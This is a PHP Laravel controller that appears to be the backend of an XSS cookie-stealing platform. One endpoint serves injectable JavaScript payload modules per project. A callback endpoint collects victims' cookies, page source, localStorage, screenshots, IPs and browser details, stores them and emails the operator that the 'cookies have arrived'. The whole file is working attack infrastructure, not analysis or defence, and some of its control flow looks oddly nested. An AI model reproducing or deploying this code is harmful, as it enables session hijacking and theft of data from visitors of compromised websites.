<?php

namespace App\Http\Controllers\Index;
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Headers: *');
use App\Facades\ClientAuth;
use App\Facades\Option;
use App\Http\Controllers\Controller;
use App\Libs\SendEmail;
use App\Models\Article;
use App\Models\Menu;
use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
//use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

use apanly\BrowserDetector\Browser;
use apanly\BrowserDetector\Os;
use apanly\BrowserDetector\Device;

class IndexController extends Controller
{

    //页面代码
    public function seriptCode(Request $request, $urlKey = ''){
      
        if(strlen($urlKey) > 4 || strlen($urlKey) <= 0){
            throw new \Symfony\Component\HttpKernel\Exception\HttpException(404);
        }

        $project = DB::table('projects')->where(['urlKey'=>$urlKey])->first();
        if(empty($project)){
            throw new \Symfony\Component\HttpKernel\Exception\HttpException(404);
        }

        $project = json_decode(json_encode($project), true);

        $htphot=@parse_url($_SERVER['HTTP_REFERER']);

        $filterdomain= !empty($htphot['host']) ? $htphot['host'] : null;
        $allfilter = DB::table('allfilters')->get();
        /**
         * 过滤方法，特殊的地址
         */
        if(!empty($allfilter)){
            foreach($allfilter as $k=>$v){
                if(strstr($filterdomain,$v->filterurl)) exit();
            }
        }
        $moduleSetKeys=json_decode($project['moduleSetKeys'],true);

        /* 模块 begin */
        $moduleIds=array();
        if(!empty($project['modules'])) $moduleIds=json_decode($project['modules']);


        if(!empty($moduleIds)){
//            $modulesStr=implode(',',$moduleIds);
//            $modules=$db->Dataset("SELECT * FROM ".Tb('modules')." WHERE id IN ($modulesStr)");

            $modules = DB::table('modules')->whereIn('id',$moduleIds)->get();
            $modules = json_decode(json_encode($modules), true);

            if(!empty($modules)){
                foreach($modules as $module){
                    $module['code']=str_replace('{projectId}',$project['urlKey'],$module['code']);
                    $setkeys=json_decode($module['setkeys'],true);
                    //module里是否有配置的参数
                    if(!empty($setkeys)){

                        foreach($setkeys as $setkey){
                            if(!empty($moduleSetKeys["setkey_{$module['id']}_{$setkey}"])){
                                $module['code']=str_replace('{set.'.$setkey.'}',urldecode($moduleSetKeys["setkey_{$module['id']}_{$setkey}"]),$module['code']);
                            }
                        }
                    }
                    echo htmlspecialchars_decode($module['code'],ENT_QUOTES);
                }
            }
        }

        /* 模块 end */
        /* 项目自定义代码 */
        echo htmlspecialchars_decode($project['code'],ENT_QUOTES);
        exit();
    }


    /**
     * 生成index.html文件生成的数据
     * @return array
     */
    public function indexData(){
        $config_url = (config('laravel_admin.domain_auto')?'':config('app.url')).getRoutePrefix(config('laravel_admin.web_api_model'));
        $config_url = $this->checkUrl($config_url);
        return [
            'time_str'=>'&time='.time(),
            'app_name'=>config('app.name'),
            'config_url'=>$config_url
        ];
    }

    protected function checkUrl($url){
        return (!$url ||
            Str::startsWith($url,'http://') ||
            Str::startsWith($url,'https://') ||
            Str::startsWith($url,'/')
        )?$url:'//'.$url;
    }
    /**
     * 所有页面显示
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\Contracts\View\View
     */
    public function index(){

        $system = $this->indexData();
        $system['article'] = Article::limit(10)->get();

        return view('index.index',$system);
    }

    /**
     * @param Request $request
     * @param int $id
     * @return \Illuminate\Contracts\Foundation\Application|\Illuminate\Contracts\View\Factory|\Illuminate\Contracts\View\View
     * 新闻内容
     */
    public function articlecontent(Request $request, $id = 0){
//        $id = $request->input('id','');

        $content = DB::table('articles')->where(['id'=>$id])->first();
        return view('index.article_show',['info'=>$content]);
    }

    public function articleList(){
        $list = DB::table('articles')->paginate(15);
        return view('index.article_list', [
            'list'=>$list
        ]);
    }

    /**
     * @param Request $request
     * base64加密
     */
    public function encodeBase64(Request $request){
        return view('index.base64');
    }

    /**
     * 404页面
     * @return \Illuminate\Http\Response
     */
    public function page404(){
        return response()->view('index',$this->indexData(),404);
    }

    /**
     * 系统配置数据获取
     * @return mixed
     */
    public function config(){
        $app_url = config('laravel_admin.domain_auto')?'':config('app.url');
        $app_url = $this->checkUrl($app_url);
        $data['logo'] = config('laravel_admin.logo');
        $data['name'] = config('app.name');
        $data['name_short'] = config('laravel_admin.name_short');
        $data['debug'] = config('app.debug');
        $data['env'] = config('app.env');
        $data['icp'] = config('laravel_admin.icp');
        $data['api_url_model'] =  config('laravel_admin.web_api_model');
        $data['app_url'] = $app_url;
        $data['api_url'] = $app_url.getRoutePrefix();
        $data['web_url'] = $app_url.getRoutePrefix('web');
        $data['domain'] = config('session.domain');
        $data['lifetime']= config('session.lifetime');
        $data['verify'] = config('laravel_admin.verify.type')=='captcha' ? $this->captcha() : $this->geetest(); //验证配置
        $data['client_id'] = ClientAuth::getClient();
        $data['default_language'] = str_replace('_','-',app('translator')->getLocale());
        $data['tinymce_key'] = config('laravel_admin.tinymce_key','');
        $data['locales'] = collect(config('laravel_admin.locales',[]))
            ->prepend(config('app.locale'))
            ->filter()
            ->unique()
            ->map(function ($value){
                return str_replace('_','-',$value);
            })
            ->values()
            ->toArray();
        //高德地图配置
        $amap_config = [
            'key'=>config('laravel_admin.amap.js_api.key',''),
            'searchUrl'=>'/home/map/search-amap' //高德地图搜索接口
        ];
        //if($data['env']=='local'){
            $amap_config['securityJsCode'] = config('laravel_admin.amap.js_api.secret','');
       /* }else{
            $amap_config['serviceHost']=$app_url.'/_AMapService';
        }*/
        $data['amap_config'] = $amap_config;
        $data['google_config'] = [
            'key'=>config('laravel_admin.google.js_api.key',''),
            'searchUrl'=>'/home/map/search-google' //谷歌地图搜索接口
        ];
        $data['version'] = Option::get('system_version_no','v1.0.0');
        $data['baidu_statistics_url'] = Option::get('baidu_statistics_url','');
        $data['page_gray'] = Option::get('page_gray',0);
        $data['c_j_u'] = collect(str_split(Option::get('crawler_jump_url','')))->filter()->toArray();
        $max_age = 3600*24;
        $response = Response::returns($data)
            ->header('Cache-Control','max-age='.$max_age)
            ->header('Expires',gmdate('D, d M Y H:i:s ',time()+$max_age).'GMT');
        return $this->addClientId($response,$data['client_id']);
    }

    /**
     * 添加Client-Id
     * @param $response
     * @param $client_id
     * @return mixed
     */
    protected function addClientId($response,$client_id){
        $domain = config('session.domain');
        return $response->cookie(config('laravel_admin.client_id_key'),$client_id,60*365*10,'/',$domain,null,false);
    }

    /**
     * 极验验证
     * @return array
     */
    protected function geetest()
    {
        return [
            'type'=>'geetest',
            'dataUrl'=>config('geetest.url'),
            'data'=>[
                'client_fail_alert'=>config('geetest.client_fail_alert',trans('Validation fails!')),
                'lang'=> app('translator')->getLocale(),
                'product'=>'float',
                'http'=>'http://'
            ]
        ];
    }

    /**
     * 图片验证码
     * @return array
     */
    protected function captcha(){
        return [
            'type'=>'captcha',
            'dataUrl'=> captcha_src(), //验证码图片地址
            'data'=>[],
            'length'=>config('captcha.default.length'),
        ];
    }

    /**
     * 刷新token
     * @return mixed
     */
    public function refreshToken(){
        $data['_token'] = csrf_token()?:'';
        return Response::returns($data);
    }

    /**
     * 获取连接ID标识
     * @return mixed
     */
    public function clientId(){
        $data = ['client_id'=>ClientAuth::getClient()];
        $response = Response::returns($data);
        return $this->addClientId($response,$data['client_id']);
    }

    /**
     * 获取用户信息
     */
    public function user(){
        $user = Auth::user();
        $lifetime = config('session.lifetime');
        if($user){
            $user->load('admin','admin.roles');
            if(!$user->tokenCan('remember')){
                $lifetime = config('laravel_admin.no_remember_lifetime');
            };
        }
        return Response::returns([
            'user'=>$user,
            'lifetime'=>$lifetime
        ]);
    }

    /**
     * 获取菜单信息
     */
    public function menu(){
        $obj = Menu::main()
            ->select(['id','name','icons','description',
                'url','parent_id','resource_id','status','level',
                'left_margin','right_margin','method','is_out_link'
            ])
            ->orderBy('left_margin','asc')
            ->with(['parent'=>function($q){
                $q->select([
                    'id',
                    'name',
                    'item_name'
                ]);
            }]);
        if(Request::input('type')=='document'){
            if(!isset($this->common_responses)){
                $file = storage_path('/developments/api-doc-common.json');
                $this->common_responses = [];
                if(file_exists($file)){
                    $common_responses_data = json_decode(file_get_contents($file),true)?:[];
                    $common_responses = Arr::get($common_responses_data,'common_responses',[]);
                    collect(Arr::get($common_responses_data,'common_responses_list',[]))
                        ->each(function ($item)use(&$common_responses){
                            $common_responses[] = $item;
                            $common_responses[] = [
                                'name'=>'list.'.$item['name'],
                                'description'=>$item['description']
                            ];
                        });
                    $this->common_responses = $common_responses;
                }
            }
            $data['common_responses'] = $this->common_responses;
        }
        $data['menus'] = collect($obj->get())
            ->map(function ($item){
                $item[config('laravel_admin.trans_prefix').'name'] = Menu::trans($item,'name');
                $item[config('laravel_admin.trans_prefix').'description'] = Menu::trans($item,'description');
                return $item;
            });

        return Response::returns($data);
    }

    /**
     * 查询单个菜单详情
     */
    public function menuInfo(){
        $request = app('request');
        $validator = Validator::make($request->all(), [
            'id'=>'required|integer'
        ]);
        if ($validator->fails()) {
            throw ValidationException::withMessages($validator->errors()->toArray());
        }
        $id = app('request')->input('id',0);
        $row = Menu::main()
            ->select(['id'])
            ->with(['route_params','params','body_params','responses'])
            ->find($id);
        return Response::returns(['row'=>$row]);

    }

    public function api404(){
        return Response::returns([
            'errors' => ['roue'=>trans('Routing address error')],
            'message' => trans('The resource you visited does not exist')
        ],404);
    }


    public function setCallback(Request $request){

//        $id=Val('id','REQUEST');
        $id = $request->input('id', '');
        $imgs = $request->input('imgs', '');  //411161555 图片XSS     1表单模块    2截屏模块
        $call = $request->input('callback', '');
     
        if(!empty($call)){
            echo '';
            exit();
        }


        if($id){

            $project = DB::table('projects')->where(['urlKey'=>$id])->first();
            $project = json_decode(json_encode($project), true);
            if(empty($project)) exit();


            $cookienumbers = DB::table('project_contents')->where(['projectId'=>$project['id'], 'allowdel'=>0, 'hide'=>0])->count();

            $hide = 0;
            if($cookienumbers > 100){


                $huiyuan = DB::table('members')->select('huiyuantime', 'huiyuan', 'user_name', 'email')->where(['id'=>$project['userId']])->first();

            //用户提供的content
            $content=array();
            //待接收的key
            $keys=array();
            $serverContent=array();
            /* 模块 begin */
            $moduleIds=array();
            if(!empty($project['modules'])) $moduleIds=json_decode($project['modules']);

            if(!empty($moduleIds)){

                $modules = DB::table('modules')->whereIn('id', $moduleIds)->get();
                $modules = json_decode(json_encode($modules), true);

                if(!empty($modules)){
                    foreach($modules as $module){
                        if(!empty($module['keys'])) $keys=array_merge($keys,json_decode($module['keys']));
                    }
                }
            }

            /* 模块 end */
            foreach($keys as $key){
                $content[$key]= $request->input($key);
            }



            if($imgs == 1 && isset($content['cookie'])){
                $content['cookie'] = urlencode(StripStr(base64_decode($content['cookie'])));
            }

            if(in_array('toplocation',$keys)){
                $content['toplocation']=!empty($content['toplocation']) ? $content['toplocation'] : $content['location'];
            }

            $judgeCookie=in_array('cookie',$keys) ? true : false;
            $cookieHash = $project['id'];
            /* cookie hash */
            if(isset($content['cookie'])){
                $cookieHash .= '_'.$content['cookie'];
            }
            if(isset($content['location'])){
                $cookieHash .= '_'.$content['location'];
            }
            if(isset($content['toplocation'])){
                $cookieHash .= '_'.$content['toplocation'];
            }
            if(isset($content['duquurl'])){
                $cookieHash .= '_'.$content['duquurl'];
            }
            $cookieHash=md5($cookieHash);
            if(!empty($content['pic-ip']) && $imgs == 411161555){
                $serverContent['HTTP_USER_AGENT']=$content['pic-agent'];
                $serverContent['REMOTE_ADDR']=$content['pic-ip'];
                $serverContent['IP-ADDR']=urlencode(adders($content['pic-ip']));
                $cookieHash=md5($project['id'].'_'.$content['location'].'_'.$serverContent['HTTP_USER_AGENT'].'_'.$serverContent['REMOTE_ADDR'].'_'.$serverContent['cookie']);
            }else{
                unset($content['pic-ip']);
                unset($content['pic-agent']);
            }


            $pInfo = DB::table('project_contents')->where(['projectId'=>$project['id'], 'cookieHash'=>$cookieHash])->orderBy('id','desc')->first();
            $pInfo = json_decode(json_encode($pInfo), true);

            $ltime = empty($pInfo['create_time']) ? 0 : strtotime($pInfo['create_time']);


            $web_url = DB::table('configs')->where(['key'=>'web_url'])->select('value')->first();
            
            $web_url = empty($web_url->value) ? '' : $web_url->value;
           
            if(time() - $ltime > 180){

                if(1 == 1 ){
                    $content['screenshotpic'] = empty($content['screenshotpic']) ? '' : $content['screenshotpic'];
                    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $content['screenshotpic'], $result)){

                        $type = "png";
                        $basedir = "/index/themes/picxss/".date("Y-m-d")."/";
                        mkdirswjj(public_path().$basedir);
                        $basedir_file = $basedir.$cookieHash."-".$project['id'].date("h").".".$type;

                        $file_path=dirname(dirname(__FILE__)).$basedir_file;

                        if(file_put_contents(public_path().$basedir_file, base64_decode(str_replace($result[1], '', $content['screenshotpic'])))){

                            $qiniu_file_path = $basedir_file;

                            $content['screenshotpic'] = urlencode("<a href='{$qiniu_file_path}' target='_blank' title='点击查看对方网页截图'><img src='{$qiniu_file_path}' style='width:150px;height:50px;'></a>");
                        }else{
                            unset($content['screenshotpic']);
                        }
                    }

                    //服务器获取的content
                    if($imgs == 411161555){   //图片XSS
                        if(empty($content['location'])){
                            $content['location'] = $content['toplocation'];
                            if(empty($content['location'])){
                                exit;
                            }
                        }
                        $serverContent['HTTP_REFERER']=$content['location'];
                        $referers=@parse_url($serverContent['HTTP_REFERER']);
                        $domain=$referers['host']?$referers['host']: '';

                        $content['cookie']=str_replace("----","<br/>",$content['cookie']);
                        $content['cookie']=urlencode($content['cookie']);
                        $serverContent['imgs']= 411161555;
                        unset($content['pic-ip']);
                        unset($content['pic-agent']);
                    }elseif($imgs == 1){   //表单模块
                        if(empty($content['location'])){
                            $content['location'] = $content['toplocation'];
                            if(empty($content['location'])){
                                exit;
                            }
                        }

                        $serverContent['HTTP_REFERER']=$content['location'];
                        $referers=@parse_url($serverContent['HTTP_REFERER']);
                        $domain=$referers['host']?$referers['host']: '';

                        $serverContent['HTTP_USER_AGENT']=$content['agent'];
                        $serverContent['REMOTE_ADDR']=$content['ip'];
                        $serverContent['IP-ADDR']=urlencode(adders($content['ip']));
                        $serverContent['imgs']= 1;
                        $content['cookie']=str_replace("----","<br/>",$content['cookie']);
                        unset($content['agent']);
                    }else{

                        $browser = new Browser();
                        $os = new Os();
                        $device = new Device();

                        $sbw = "";
                        if($device->getName()!="unknown"){
                            $sbw = "<br/>设备为：".$device->getName();
                        }
                        $dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
                        if(isset($content['title']) || isset($content['htmlyuanma'])){
                            if(isset($content['title'])){
                                $content['title'] = urlencode($content['title']);
                            }
                            if(isset($content['htmlyuanma'])){
                                $nothttpurl = str_replace('http://','',$web_url);
                                $nothttpurl = str_replace('https://','',$nothttpurl);
                                $content['htmlyuanma'] = urlencode(str_replace($nothttpurl,"xxx平台JS代码xxx",$content['htmlyuanma']));
                            }
                        }
                        if(isset($content['cookie'])){
                            $content['cookie'] = urlencode($content['cookie']);
                        }
                        if(isset($content['datastorage'])){
                            $content['datastorage'] = urlencode(str_replace("----","<br/>",$content['datastorage']));
                        }



                        $serverContent['HTTP_REFERER']= empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'];
                        $referers=@parse_url($serverContent['HTTP_REFERER']);
                        $domain= !empty($referers['host'])?$referers['host']: '';
                        $domain=StripStr($domain);
                        $serverContent['HTTP_REFERER']=StripStr(empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER']);
                        $serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
                        $user_ip=get_ipip();
                        $serverContent['REMOTE_ADDR']=StripStr($user_ip);
                        $serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
                        if(isset($content['referrer'])){
                            if(strcmp($serverContent['HTTP_REFERER'], $content['referrer']) !== 0){
                                $serverContent['HTTP_REFERER'] = $content['referrer'];
                            }
                            unset($content['referrer']);
                        }
                        if(isset($content['useragent'])){
                            if(strcmp($serverContent['HTTP_USER_AGENT'], $content['useragent']) !== 0){
                                $serverContent['HTTP_USER_AGENT'] = $content['useragent'];
                            }
                            unset($content['useragent']);
                        }
                    }



                    $ipurlblack = DB::table('ipurlblacks')->where(['userId'=>$project['userId'], 'moduleid'=>$project['id']])->get();
                    $ipurlblack = json_decode(json_encode($ipurlblack), true);

                    if(!empty($ipurlblack)){
                        foreach($ipurlblack as $ipurl){
                            if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
                                if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
                            }
                            if(!empty($content['toplocation']) && !empty($ipurl['url'])){
                                if(strstr($content['toplocation'],$ipurl['url'])) exit();
                            }
                        }
                    }
                    unset($content['imgs']);
                    $content = array_filter($content);
                    $serverContent = array_filter($serverContent);
                    $values=array(
                        'projectId'=>$project['id'],
                        'content'=>json_encode($content),
                        'serverContent'=>json_encode($serverContent),
                        'domain'=>$domain,
                        'cookieHash'=>$cookieHash,
                        'qiniu_file_path'=>empty($qiniu_file_path) ? '' : $qiniu_file_path,
                        'num'=>1,
                        'hide'=>$hide,
                        'create_time'=>date('Y-m-d H:i:s'),
                        'member_id'=>$project['userId'],
                        'update_time'=>date('Y-m-d H:i:s'),
                    );
                    DB::table('project_contents')->insert($values);
                    $Getcookie= !empty($content['cookie']) ? $content['cookie'] : null;
                    $uid = $project['userId'];
                    $userInfo = DB::table('members')->where(['id'=>$uid])->first();
                    $userInfo = json_decode(json_encode($userInfo), true);
                    if(!empty($userInfo['email']) && $userInfo['message']==1){

                        if($hide != '1'){

                            $info = DB::table('emails')->where(['type'=>2])->first();
                            $eConfig = [
                                'email_server'=>empty($info->email_server) ? env('MAIL_HOST') : $info->email_server,
                                'email'=>empty($info->send_email) ? env('MAIL_USERNAME') : $info->send_email,
                                'password'=>empty($info->password) ? env('MAIL_PASSWORD') : $info->password,
                                'port'=>empty($info->port) ? env('MAIL_PORT') : $info->port
                            ];


                            $sendMailObj = new SendEmail($eConfig);
                            $sendMailObj->send($userInfo['email'], 'xss8商城已收货', "尊敬的".$userInfo['user_name']."，您在xss8商城已收货 预订的饼干<br>Cookie:{$Getcookie}<br>已经到货！货物地址：{$domain}", 'xss8商城已收货');

                        }
                    }

                }}else{

                //服务器获取的content
                if($imgs == 411161555){   //图片XSS
                    if(empty($content['location'])){
                        $content['location'] = $content['toplocation'];
                        if(empty($content['location'])){
                            exit;
                        }
                    }
                    //$content['HTTP_USER_AGENT'] = Val('agent','GET');
                    $serverContent['HTTP_REFERER']=$content['location'];
                    $referers=@parse_url($serverContent['HTTP_REFERER']);
                    $domain=$referers['host']?$referers['host']: '';
                    //$domain=StripStr($domain);
                    $content['cookie']=urlencode($content['cookie']);
                    $serverContent['imgs']= 411161555;
                    $content['cookie']=str_replace("----","<br/>",$content['cookie']);
                    unset($content['pic-ip']);
                    unset($content['pic-agent']);
                }elseif($imgs == 1){   //表单模块
                    if(empty($content['location'])){
                        $content['location'] = $content['toplocation'];
                        if(empty($content['location'])){
                            exit;
                        }
                    }
                    //$content['HTTP_USER_AGENT'] = Val('agent','GET');
                    $serverContent['HTTP_REFERER']=$content['location'];
                    $referers=@parse_url($serverContent['HTTP_REFERER']);
                    $domain=$referers['host']?$referers['host']: '';
                    //$domain=StripStr($domain);
                    $serverContent['HTTP_USER_AGENT']=$content['agent'];
                    $serverContent['REMOTE_ADDR']=$content['ip'];
                    $serverContent['IP-ADDR']=urlencode(adders($content['ip']));
                    $serverContent['imgs']= 1;
                    $content['cookie']=str_replace("----","<br/>",$content['cookie']);
                    unset($content['agent']);
                }else{
                    $browser = new Browser();
                    $os = new Os();
                    $device = new Device();
                    $sbw = "";
                    if($device->getName()!="unknown"){
                        $sbw = "<br/>设备为：".$device->getName();
                    }
                    $dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
                    if(isset($content['title']) || isset($content['htmlyuanma'])){
                        if(isset($content['title'])){
                            $content['title'] = urlencode($content['title']);
                        }
                        if(isset($content['htmlyuanma'])){
                            $nothttpurl = str_replace('http://','',$web_url);
                            $nothttpurl = str_replace('https://','',$nothttpurl);
                            $content['htmlyuanma'] = urlencode(str_replace($nothttpurl,"xxx平台JS代码xxx",$content['htmlyuanma']));
                        }
                    }
                    if(isset($content['cookie'])){
                        $content['cookie'] = urlencode($content['cookie']);
                    }
                    if(isset($content['datastorage'])){
                        $content['datastorage'] = urlencode(str_replace("----","<br/>",$content['datastorage']));
                    }
                    $serverContent['HTTP_REFERER']= empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'];
                    $referers=@parse_url($serverContent['HTTP_REFERER']);
                    $domain=!empty($referers['host'])?$referers['host']: '';
                    $domain=StripStr($domain);
                    $serverContent['HTTP_REFERER']=StripStr(empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER']);
                    $serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
                    $user_ip=get_ipip();
                    $serverContent['REMOTE_ADDR']=StripStr($user_ip);
                    $serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
                }

                $ipurlblack = DB::table('ipurlblacks')->where(['userId'=>$project['userId'], 'moduleid'=>$project['id']])->get();
                $ipurlblack = json_decode(json_encode($ipurlblack), true);

                if(!empty($ipurlblack)){
                    foreach($ipurlblack as $ipurl){
                        if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
                            if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
                        }
                        if(!empty($content['toplocation']) && !empty($ipurl['url'])){
                            if(strstr($content['toplocation'],$ipurl['url'])) exit();
                        }
                    }
                }
                unset($content['imgs']);
                $content = array_filter($content);
                $serverContent = array_filter($serverContent);

                DB::table('project_contents')->where(['projectId'=>$project['id'], 'cookieHash'=>$cookieHash])->update([
                    'content'=>json_encode($content),
                    'serverContent'=>json_encode($serverContent),
                    'num'=>DB::raw('num+1'),
                    'update_time'=>date('Y-m-d H:i:s')
                ]);
            }
            $HTTPREFERER = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
            return redirect($HTTPREFERER);
        }
    }




}
